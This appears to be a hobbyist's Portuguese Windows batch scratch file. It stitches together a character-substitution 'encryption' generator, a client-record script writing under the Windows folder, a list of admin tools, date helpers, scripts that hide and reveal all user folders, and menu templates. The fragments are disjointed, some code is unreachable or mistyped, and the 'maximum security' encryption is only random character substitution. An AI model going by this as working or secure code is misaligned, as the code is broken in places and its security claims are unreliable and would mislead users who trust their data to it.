echo set js=%%js:;=%random% =;%%>> "Criptografia_de_caracteres.cmd"
echo  ::33 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:,=%random% =,%%>> "Criptografia_de_caracteres.cmd"
echo  ::34 >> "Criptografia_de_caracteres.cmd"
echo set js=%%js:?=%random% =?%%>> "Criptografia_de_caracteres.cmd"
echo ::ACELEวรO PARA AQUI AGORA COPIA O CำDEGO >> "Criptografia_de_caracteres.cmd"
echo echo %%js%% ^> TEXTO_CRIPTOGRAFADO_MASTER.txt >>"Criptografia_de_caracteres.cmd"
echo start TEXTO_CRIPTOGRAFADO_MASTER.txt >>"Criptografia_de_caracteres.cmd"
echo echo  %%js%% ^> Texto criptografado.txt  >> "Criptografia_de_caracteres.cmd"

echo if exist texto ( goto av ) else ( goto co )  >> "Criptografia_de_caracteres.cmd"
echo :av  >> "Criptografia_de_caracteres.cmd"
echo echo. ^> %%temp%%\jsf.vbs  >> "Criptografia_de_caracteres.cmd" 
echo echo intopcao = msgbox("Desculpe mais voc๊ ainda nใo abilitou o modo seguran็a mแxima de criptografia por isso nใo pode utiliza-lo Deseja Assistir o vํdeo de como abilitar este modo ? ATENวรO APำS ABILITAR ESTE MODO DELETE O ARQUIVO DE NOME ( Texto )",vbyesno,"   js Criptografia de Caracteres") ^>^> %%temp%%\jsf.vbs  >> "Criptografia_de_caracteres.cmd" 
echo echo if intopcao = vbyes then ^>^> %%temp%%\jsf.vbs  >> "Criptografia_de_caracteres.cmd" 
    echo echo Set WshShell = WScript.CreateObject("WScript.Shell") ^>^> %%temp%%\jsf.vbs  >> "Criptografia_de_caracteres.cmd" 
  echo echo WshShell.Run ("http://youtu.be/SkwWGWYKvu4") ^>^> %%temp%%\jsf.vbs  >> "Criptografia_de_caracteres.cmd" 
echo echo end if ^>^> %%temp%%\jsf.vbs  >> "Criptografia_de_caracteres.cmd" 
echo start %%temp%%\jsf.vbs  >> "Criptografia_de_caracteres.cmd"
echo goto vs  >> "Criptografia_de_caracteres.cmd"
echo :co  >> "Criptografia_de_caracteres.cmd"



echo goto vs2 >> "Criptografia_de_caracteres.cmd"
echo :m4  >> "Criptografia_de_caracteres.cmd"
echo mode 92,10 >> "Criptografia_de_caracteres.cmd"
echo cls  >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ >> "Criptografia_de_caracteres.cmd"
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo set /p opt2= Cole o texto =) >> "Criptografia_de_caracteres.cmd"
echo FOR /F "tokens=*" %%%%B IN ("%%opt2%%") DO ( >> "Criptografia_de_caracteres.cmd"
echo set js=%%%%B >> "Criptografia_de_caracteres.cmd"
echo ) >> "Criptografia_de_caracteres.cmd"
echo ::DESCRIPTOGRAFAR TEXTO >> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo ::COLE AQUI O CำDIGO COPIADO ACIMA E FAวA AS ALTERAวีES NELE COMO MOSTRADO NO VอDEO >> "Criptografia_de_caracteres.cmd"
echo ::INICIO DO CำDIGO  COLE ENTRE O INICIO E FIM>> "Criptografia_de_caracteres.cmd"
echo echo. >> "Criptografia_de_caracteres.cmd"
echo ::FIM DO CำDIGO ( ATENวรO )NรO ALTERE O QUE ESTA ABAIXO DESTA LINHA !!!>> "Criptografia_de_caracteres.cmd"
echo echo.^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo @echo off ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo mode 91,10 ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo color 1f ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo title.                                  Script ( js ) Script ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
  echo echo echo.^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ ^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
  echo echo echo.^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo echo Sua chave =)  %%js%%^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
  echo echo echo.^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
 echo echo echo.^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo pause^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo %%js%% ^> TEXTO_DESCRIPTOGRAFADO_MASTER.txt >>"Criptografia_de_caracteres.cmd"
echo echo exit^>^> %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo start %%temp%%\cript.cmd >>"Criptografia_de_caracteres.cmd"
echo echo. ^>%%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo echo StrText = " %%js%%" ^>^> %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo echo set ObjVoice = CreateObject("SAPI.SpVoice") ^>^> %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo echo ObjVoice.Rate=-1^>^> %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo echo ObjVoice.Speak StrText  ^>^> %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo start %%temp%%\jsb.vbs >>"Criptografia_de_caracteres.cmd"
echo goto :vs2 >> "Criptografia_de_caracteres.cmd"
echo. > %temp%\jsf.vbs 
echo intopcao = msgbox("Cript criado com sucesso Deseja Assistir o vํdeo de como abilitar o modo seguran็a Mแxima de criptografia ?",vbyesno,"   js Criptografia de Caracteres") >> %temp%\jsf.vbs 
echo if intopcao = vbyes then >> %temp%\jsf.vbs 
    echo Set WshShell = WScript.CreateObject("WScript.Shell") >> %temp%\jsf.vbs 
  echo WshShell.Run ("http://youtu.be/SkwWGWYKvu4")>> %temp%\jsf.vbs 
echo end if >> %temp%\jsf.vbs 
start %temp%\jsf.vbs
start Criptografia_de_caracteres.cmd
MSG * " O VERDADEIRO AMIGO NAO APARTA  A  BRIGA JA CHEGA NA VOADORA"
goto menu 



exit

exit
Netplwiz.exe = CONTAS DE USUARIOS
rstrui.exe =reataurar
sdclt.exe =bakup e restarar bakup
services.msc =servi็os do pc
shrpubw.exe =CRIAR pastA COMPARTILHADA
WindowsAnytimeUpgradeResults.exe = CONFIRMAวรO DE ATUALIZAวรO
winver.exe = VER A VERวรO DO WINDOWS
0msconfig.exe = CONFIGURAR O SYSTEMA
MdSched.exe = DIAGNOSTICO DE MEMORIA
lusrmgr.msc = USUARIOS E GRUPO LOCAIS
Magnify.exe = LUPA
logoff.exe = trava pc
hdwwiz.exe = adicionar hardwere
gpedit.msc diretivas de grupo
GettingStarted.exe = iniciode bakup
eventvwr.msc =visulizador de eventos

:s
MSG * " O VERDADEIRO AMIGO NAO APARTA  A  BRIGA JA CHEGA NA VOADORA"
EXIT

:S
MSG * " O VERDADEIRO AMIGO NAO APARTA  A  BRIGA JA CHEGA NA VOADORA"
EXIT

::=======================================================================
::===================      BANCO DE DADOS        ======================
::=======================================================================

@echo off

:: echo msgbox"use s๓ em windows 8",vbinformation,"mensagem"> %temp%\j.vbs
::start %temp%\j.vbs

::SENHA
title Sistema de cadastro
mode 70,20
cls
::msg * Bem vindo js
:: aqui  a cor azul 1
:co1
cls
color 1f
goto in
::aqui a cor verde 2
:co2
cls
color 0a
goto in

:: aqui cor branca 3
:co3
cls
color f1
goto in
::aqui a cor vermelha 4
:co4
cls
color 0c
:in
title Sistema de cadastro
mode 70,20
cls
echo  Primeiro uso do programa crie um banco de dados Digitando =^> criar
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     (  Menu cadastros )              ( Cor do programa )
echo  _________________________      _______________________
echo.
echo  1 ^<= Novo cadastro          )    =^> ENTER ^<=------Azul =^> A
echo.
echo  2 ^<= Ver dados do Cliente   )    =^> ENTER ^<=-----Verde =^> B
echo.
echo  3 ^<= Ver todos os cadastros )    =^> ENTER ^<=----Branco =^> C
echo.
echo  4 ^<= Editar Nome de clientes)    =^> ENTER ^<=--Vermelho =^> D
echo.
echo ______________________________________________________________________
echo.
set /p s2=.      Seu comando ? =^> 
if %s2% == 1 goto nome
if %s2% == 2 goto ch
if %s2% == 3 goto tc
if %s2% == 4 goto ed
if %s2% == a goto co1
if %s2% == b goto co2
if %s2% == c goto co3
if %s2% == d goto co4
if %s2% == A goto co1
if %s2% == B goto co2
if %s2% == C goto co3
if %s2% == D goto co4
if %s2% == criar goto banco
msg * /time 5 Este comando nao existe Digite um dos comandos do Menu
goto in


:nome
msg * /time 5 ( ATENCAO ) Nao use acento nem cedilha nos cadastros pois o programa nao reconhece
mode 70,10
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.

set /p nome= .   Digite Nome =^> 
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p ka1= .   Digite  endereco =^>   

cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p ka2= .   Digite Telefone residencial =^>   

cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p ka3= .   Digite  Telefone celular =^>   

cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p ka4= .   Digite  E-mail =^>   

::    VEJA QUE AQUI ESTA OS CAMPOS CADASTROS
::1
echo  Data do cadastro /%date% As /%time% >> %windir%\sisban\"%nome%"
echo ______________________________________________________________________ >> %windir%\sisban\"%nome%"
echo.  >> %windir%\sisban\"%nome%"
echo  Nome:/ %nome% >> %windir%\sisban\"%nome%"
::2
echo ---------------------------------------------------------------------- >> %windir%\sisban\"%nome%"
echo.  >> %windir%\sisban\"%nome%"
echo  Endereco:/ %ka1% >> %windir%\sisban\"%nome%"
::3
echo ---------------------------------------------------------------------- >> %windir%\sisban\"%nome%"
echo.  >> %windir%\sisban\"%nome%"
echo  Telefone residencial:/ %ka2% >> %windir%\sisban\"%nome%"

::4
echo ---------------------------------------------------------------------- >> %windir%\sisban\"%nome%"
echo.  >> %windir%\sisban\"%nome%"
echo  Telefone Celular:/ %ka3% >> %windir%\sisban\"%nome%"
::5
echo ---------------------------------------------------------------------- >> %windir%\sisban\"%nome%"
echo.  >> %windir%\sisban\"%nome%"
echo  E-mail:/ %ka4% >> %windir%\sisban\"%nome%"
echo ______________________________________________________________________>> %windir%\sisban\"%nome%"

:: AQUI O ARQUIVO DE AJUDA PARA LEMBRAR  NOMES DE CLIENTES
echo ______________________________________________________________________ >> %windir%\sisban\todos
echo. >> %windir%\sisban\todos
echo %nome% >> %windir%\sisban\todos
echo. >> %windir%\sisban\todos
echo Data:/%date% As/%time% >> %windir%\sisban\todos

:: INICIO BARRA DE PROGRESSO
mode 45,5
title Criando cadastro... 10%%
echo.
echo Carregando Aguarde...  อ^>
ping 127.0.0.1 -n 2 > nul&goto bar1
::1
:bar1
cls
title Criando cadastro... 30%%
echo.
echo Carregando Aguarde...  อออ^>
ping 127.0.0.1 -n 2 > nul&goto bar2
::2
:bar2
cls
title Criando cadastro... 50%%
echo.
echo Carregando Aguarde...  อออออ^>
ping 127.0.0.1 -n 2 > nul&goto bar3
::3
:bar3
cls
title Criando cadastro... 70%%
echo.
echo Carregando Aguarde...  ออออออออ^>
ping 127.0.0.1 -n 2 > nul&goto bar4
::4
:bar4
cls
title Criando cadastro... 90%%
echo.
echo Carregando Aguarde...  อออออออออออออ^>
ping 127.0.0.1 -n 2 > nul&goto bar5
::5
:bar5
cls
title Criando cadastro... 100%%
echo.
echo Carregando Aguarde...  ออออออออออออออออออออ^>
ping 127.0.0.1 -n 2 > nul

msg * /time 7 o cadastro foi criado com sucesso...
goto in

:tc
cls
mode 70,100
echo.
type %windir%\sisban\todos
echo ______________________________________________________________________
echo.
echo                    =^> pressione qualquer tecla para voltar ^<=
pause> nul
goto in



:banco
md %windir%\sisban
goto in

:ch
cls
mode 70,10
msg * /time 4 ( ATENCAO ) Digite o nome do cliente da mesma forma em que foi cadastrado !
echo.
echo.
set /p nome= .   Digite o nome do cliente =^> 
if exist %windir%\sisban\"%nome%" ( goto y ) else ( msg * /time 5 o nome [ "%nome%" ] nao esta cadastrado )


:ch1
cls
mode 70,10
msg * /time 4 ( ATENCAO ) Digite o nome do cliente da mesma forma em que foi cadastrado !
echo.
echo.
set /p nome= .   Digite o nome do cliente =^> 
if exist %windir%\sisban\"%nome%" ( goto y ) else ( msg * /time 7 o nome [ "%nome%" ] nao esta cadastrado voce foi direcionado para todos os nomes cadastrados )

cls
mode 70,100
echo.
type %windir%\sisban\todos
echo ______________________________________________________________________
echo.
echo                    =^> pressione qualquer tecla para voltar ^<=
pause> nul
goto ch


:y
cls
mode 70,50
echo.
type %windir%\sisban\"%nome%"
echo.
echo ______________________________________________________________________
echo.
echo.
pause
goto in

::INICIO DO CODIGO EDITAR DADOS DO CLIENTE
:ed
mode 70,10
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p ar2= Digite nome do Cliente=^> 
:in2
cls
mode 70,55
echo.
type %windir%\sisban\"%ar2%"
echo.
echo ______________________________________________________________________
echo.
echo         { Digite o numero para o que deseja editar e der ENTER }
echo.
echo ______________________________________________________________________
echo.
echo   1 ^<= Nome            )   
echo.
echo   2 ^<= Endereco     )    
echo.
echo   3 ^<= Telefone Residencial  )    
echo.
echo   4 ^<= Telefone Celular  ) 
echo.
echo   5 ^<= E-mail                )
echo.
echo   6 ^<= Voltar para o Inicio )
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p d= Digite numero=^> 
 if %d% == 1 goto n1
 if %d% == 2 goto n2
 if %d% == 3 goto n3
 if %d% == 4 goto n4
 if %d% == 5 goto n5
 if %d% == 6 goto in
msg * /time 6 ('_') [ "%d%" ] nao E um comando valido !!!
goto in2
::PRIMEIRO DADO
:n1
echo.
msg * ATENCAO Digite Apenas as 6 primeiras letras do nome de Usuario TUDO JUNTO SEM  ESPACO !!!
set /p ar= Digite as 6 primeiras letras do nome de usuario=^> 
echo.
set /p r= Digite o novo nome=^> 
(
echo 4
echo  Nome:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%~1

(
echo 4
echo  Nome:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%
goto in2

:n2
echo.
msg * ATENCAO Digite Apenas as 6 primeiras letras do nome de Usuario TUDO JUNTO SEM  ESPACO !!!
set /p ar= Digite as 6 primeiras letras do nome de usuario=^> 
echo.
set /p r= Digite o novo Endereco=^> 
(
echo 7
echo   Endereco:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%~1

(
echo 7
echo   Endereco:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%
goto in2


:n3
echo.
msg * ATENCAO Digite Apenas as 6 primeiras letras do nome de Usuario TUDO JUNTO SEM  ESPACO !!!
set /p ar= Digite as 6 primeiras letras do nome de usuario=^> 
echo.
set /p r= Digite Telefone Residencial=^> 
(
echo 10
echo  Telefone residencial:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%~1

(
echo 10
echo  Telefone residencial:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%
goto in2


:n4
echo.
msg * ATENCAO Digite Apenas as 6 primeiras letras do nome de Usuario TUDO JUNTO SEM  ESPACO !!!
set /p ar= Digite as 6 primeiras letras do nome de usuario=^> 
echo.
set /p r= Digite Telefone Celular=^> 
(
echo 13
echo  Telefone Celular:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%~1

(
echo 13
echo  Telefone Celular:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%
goto in2


:n5
echo.
msg * ATENCAO Digite Apenas as 6 primeiras letras do nome de Usuario TUDO JUNTO SEM  ESPACO !!!
set /p ar= Digite as 6 primeiras letras do nome de usuario=^> 
echo.
set /p r= Digite o novo Email=^> 
(
echo 16
echo  E-mail:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%~1

(
echo 16
echo  E-mail:/ %r%
echo w
echo e
) | EDLIN /B %windir%\sisban\%ar%
goto in2

::=======================================================================
::========================HORA NOS ARQUIVO ==============================
::=======================================================================
:data
@ECHO OFF
color 1f
cls
time /t
date /t
title **********tipo de horario***************

echo ******************************************                             
echo *        tipo de data e hora             *
echo ******************************************
echo *                                        *
echo *                                        *
echo *                                        *
echo *       ( 1 ) dia mes ano hora :         *
echo *       ( 2 )  data / /  hora :          *
echo *       ( 3 ) - - - :                    *
echo *                                        *
echo *                                        *
echo *                                        *
echo *                                        *
echo *                                        *
echo *                                        *
echo ******************************************
echo *             DEDE WIZARD                *
echo ******************************************
SET /P OP=DIGITE SUA OPวรO

if %op% equ 1 goto 1
if %op% equ 2 goto 2
if %op% equ 3 goto 3


:1
echo dia %date:~0,2% mes %date:~3,2% ano %date:~ 6,10% hora %time:~0,2%:%time:~3,2% >> rede.txt
cls
goto menu 

:2
echo data %date:~0,2%/%date:~3,2%/%date:~ 6,10% hora %time:~0,2%:%time:~3,2% >> rede.txt
cls
goto menu

:3
echo %date:~0,2%-%date:~3,2%-%date:~ 6,10%-%time:~0,2%:%time:~3,2% >> rede.txt
cls
goto menu


FOR /F "TOKENS=1,2,3,4 DELIMS=/ " %%A IN ('DATE/T') DO SET DATA=%%B-%%C-%%D

SET ARQ_ENT=%1
SET ARQUIVO=%ARQ_ENT:~0,-4%
SET ARQ_EXT=%ARQ_ENT:~-4%

REN %1 %ARQUIVO%%DATA%%ARQ_EXT%
========================================================================================
  
data e hora nno nome do arquivo

 echo >>rede%date:~0,2%-%date:~3,2%-%date:~ 6,10%-%time:~0,2%-%time:~3,2%.txt
=======================================================================================
data e hora dentro do arquivo

::use


echo dia %date:~0,2% mes %date:~3,2% ano %date:~ 6,10% hora %time:~0,2%:%time:~3,2% >> rede.txt 


echo data %date:~0,2%/%date:~3,2%/%date:~ 6,10% hora %time:~0,2%:%time:~3,2% >> rede.txt

 
echo %date:~0,2%-%date:~3,2%-%date:~ 6,10%-%time:~0,2%:%time:~3,2% >> rede.txt 

:revesco
::=======================================================================
::===================              REVELA E ESCONDE             ======================
::=======================================================================
echo @ echo off >> escond.bat
echo cd C:\Users\%username%\Documents >> escond.bat
echo attrib +h /d /s >> escond.bat
echo cd.. >> escond.bat
echo cd C:\Users\%username%\Downloads >> escond.bat
echo attrib +h /d /s >> escond.bat
echo cd.. >> escond.bat
echo cd C:\Users\%username%\Music >> escond.bat
echo attrib +h /d /s >> escond.bat
echo cd.. >> escond.bat
echo cd C:\Users\%username%\Pictures >> escond.bat
echo attrib +h /d /s >> escond.bat
echo cd.. >> escond.bat
echo cd C:\Users\%username%\Videos >> escond.bat
echo attrib +h /d /s >> escond.bat
===============================================================
echo @ echo off >> revela.bat
echo cd C:\Users\%username% >> revela.bat
echo attrib -h /d /s >> revela.bat
echo cd.. >> revela.bat
echo cd C:\Users\%username%\Documents >> revela.bat
echo attrib -h /d /s >> revela.bat
echo cd.. >> revela.bat
echo cd C:\Users\%username%\Downloads >> revela.bat
echo attrib -h /d /s >> revela.bat
echo cd.. >> revela.bat
echo cd C:\Users\%username%\Music >> revela.bat
echo attrib -h /d /s >> revela.bat
echo cd.. >> revela.bat
echo cd C:\Users\%username%\Pictures >> revela.bat
echo attrib -h /d /s >> revela.bat
echo cd.. >> revela.bat
echo cd C:\Users\%username%\Videos >> revela.bat
echo attrib -h /d /s >> revela.bat
GOTO MENU

::==============================================================================================
::================================  ATALHOS DAS PASTAS  ========================================
::==============================================================================================
:pastas

echo @echo off
echo ::========DOWNLOADS==============
echo start C:\Users\%username%\Downloads
echo ::=========MEU COMPUTADOR=========
echo start ::{20D04FE0-3AEA-1069-A2D8-08002B30309D}
echo ::=======MEUS DOCUMENTOS==========
echo start ::{450D8FBA-AD25-11D0-98A8-0800361B1103}
echo ::========MUSICAS=================
echo start C:\Users\%username%\Music
echo ::========PASTA DO USUARIO=========
echo start C:\Users\%username%\
echo ::==========PASTA IMAGEM==========
echo start C:\Users\%username%\Pictures
echo ::===========PASTA VIDEO==========
echo start C:\Users\%username%\Videos

pause
goto menu

::==============================================================================================
::==================================     esquema de menu                        ========================
::==============================================================================================


@echo off
::=======================================================================================================
::=====================================    tipos de menus   =============================================
::=======================================================================================================

MODE 65,15 
:demo
echo.
echo.
color 1b
echo  ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
echo  บ                                                         บ
echo  บ                                                         บ
echo  ฬอออออออออออออออออออออออออออออออออออออออออออออออออออออออออน
echo  บ                                                         บ
echo  บ                                                         บ
echo  บ                                                         บ
echo  บ                                                         บ
echo  บ                                                         บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

echo       ฮออฮออฮออฮอออ
echo       ฮออฮออฮออฮอออ
ping 127.0.0.1 -n 2 > nul


:2
mode 50,25
time /t
date /t
title **********tipo de horario***************

echo ******************************************
echo *        tipo de data e hora             *
echo ******************************************
echo *                                        *
echo *                                        *
echo *                                        *
echo *       ( 1 ) dia mes ano hora :         *
echo *       ( 2 )  data / /  hora :          *
echo *       ( 3 ) - - - :                    *
echo *                                        *
echo *                                        *
echo *                                        *
echo *                                        *
echo *                                        *
echo *                                        *
echo ******************************************
echo *             DEDE WIZARD                *
echo ******************************************

ping 127.0.0.1 -n 2 > nul


:3
mode 70,20
cls
echo  Primeiro uso do programa crie um banco de dados Digitando =^> criar
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     (  Menu cadastros )              ( Cor do programa )
echo  _________________________      _______________________
echo.
echo  1 ^<= Novo cadastro          )    =^> ENTER ^<=------Azul =^> A
echo.
echo  2 ^<= Ver dados do Cliente   )    =^> ENTER ^<=-----Verde =^> B
echo.
echo  3 ^<= Ver todos os cadastros )    =^> ENTER ^<=----Branco =^> C
echo.
echo  4 ^<= Editar Nome de clientes)    =^> ENTER ^<=--Vermelho =^> D
echo.
echo ___________________________________________________________________
echo.
ping 127.0.0.1 -n 2 > nul
      



:4
mode 60,20
echo.
echo.
color 3f
echo ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ 
echo ณรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤณณ
echo ณฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤณ
echo.
echo  (1) 
echo.
echo  (2)
echo.
echo  (3)
echo.
echo  (4)
echo.
echo  (5)
echo.
echo ณฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤณ 
echo ณรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤรฤณณ
echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู 
ping 127.0.0.1 -n 2 > nul
 
@echo off
mode 60,20
echo.
echo.
color 3f
echo ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
echo ณ                                                 ณ
echo ณฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤณ
echo.
echo  (1) 
echo.
echo  (2)
echo.
echo  (3)
echo.
echo  (4)
echo.
echo  (5)
echo.
echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู 

ping 127.0.0.1 -n 2 > nul

:5

mode 80,20
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo Û       MENU                                                    Û
echo ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
echo.
echo  (1) 
echo.
echo  (2)
echo.
echo  (3)
echo.
echo  (4)
echo.
echo  (5)
echo.
echo ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
echo.
echo.
 
ping 127.0.0.1 -n 2 > nul
:6



@echo off
mode 55,15
echo.
echo         ษหหหหหหหหหหหหหหหหหหหหหหหหหหหหหหป
echo         ฬนสสสสสสสสสสสสสสสสสสสสสสสสสสสสฬน
eecho.
echo  (1) 
echo.
echo  (2)
echo.
echo  (3)
echo.
echo  (4)
echo.
echo  (5)
echo.
echo         ฬนหหหหหหหหหหหหหหหหหหหหหหหหหหหหฬน
echo         ศสสสสสสสสสสสสสสสสสสสสสสสสสสสสสสผ
                                                 

ping 127.0.0.1 -n 2 > nul
mode 60,20
echo.
echo.
echo.
echo     ษออหออหออหออป
echo     บ  บ  บ  บ  บ                                 
echo     ฬออฮออฮออฮออน   =^>    =^>  -=  =-= -=^>^>  
echo     บ  บ  บ  บ  บ 
echo     ฬออฮออฮออฮออนาึ ู ฺ Ü ฿                       
echo     บ  บ  บ  บ  บ                               
echo     ศออสออสออสออผ    
echo.
echo ___________________________________________________
echo.


ping 127.0.0.1 -n 2 > nul


@echo off

::===================encriptar dados==========================

cls
color 0a
title.     Scripts ( js ) Scripts
mode 75,20
echo                 Sempre Apขs um comando Pressione=^> ENTER
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo   1 ^<= Criptografa Arquivo
echo.
echo   2 ^<= Descriptografa Arquivo
echo.
echo   3 ^<= Esconder Arquivo ou pasta
echo.
echo   4 ^<= Mostrar arquivo ou pasta
echo.
echo   5 ^<= Menu Principal
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ


ping 127.0.0.1 -n 2 > nul

::=================================================================================================


::=================================================================================================

@echo off
mode 92,18 
cls 
color 0a 
title Script ( js ) Script 
echo. 
echo                         ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ 
echo                         ณ        * CRIE SUA CHAVE UNICA *        ณ 
echo                         ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู 
echo                                  01101010 01110011 00100000      
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ 
echo  บบบบบบบบบบบณ   Criptografa - 1   ณ ณ #@จ**(`Jybryvcdtr$#@!yw?//็7+ง.+ ฃ?*$?{ช ณบบบบบบบบบ 
echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ 
